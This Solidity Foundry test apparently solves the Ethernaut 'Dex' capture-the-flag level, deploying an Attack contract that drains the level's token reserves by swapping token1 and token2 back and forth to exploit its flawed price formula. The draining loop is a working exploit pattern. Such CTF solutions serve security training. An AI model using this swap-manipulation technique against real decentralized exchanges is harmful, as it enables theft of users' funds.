// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/22-Dex/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Dex level = Dex(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        Attack hack = new Attack();
        ERC20(level.token1()).transfer(address(hack), 10);
        ERC20(level.token2()).transfer(address(hack), 10);
        hack.attack(levelAddress);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    function attack(address target) public {
        Dex dex = Dex(target);
        address t1 = dex.token1();
        address t2 = dex.token2();
        while (dex.balanceOf(t1, target) != 0 && dex.balanceOf(t2, target) != 0) {
            uint256 balance1 = dex.balanceOf(t1, address(this));
            uint256 dex1 = dex.balanceOf(t1, target);
            uint256 amount1 = balance1 > dex1 ? dex1 : balance1;
            dex.approve(target, amount1);
            dex.swap(t1, t2, amount1);

            uint256 balance2 = dex.balanceOf(t2, address(this));
            uint256 dex2 = dex.balanceOf(t2, target);
            uint256 amount2 = balance2 > dex2 ? dex2 : balance2;
            dex.approve(target, amount2);
            dex.swap(t2, t1, amount2);
        }
    }
}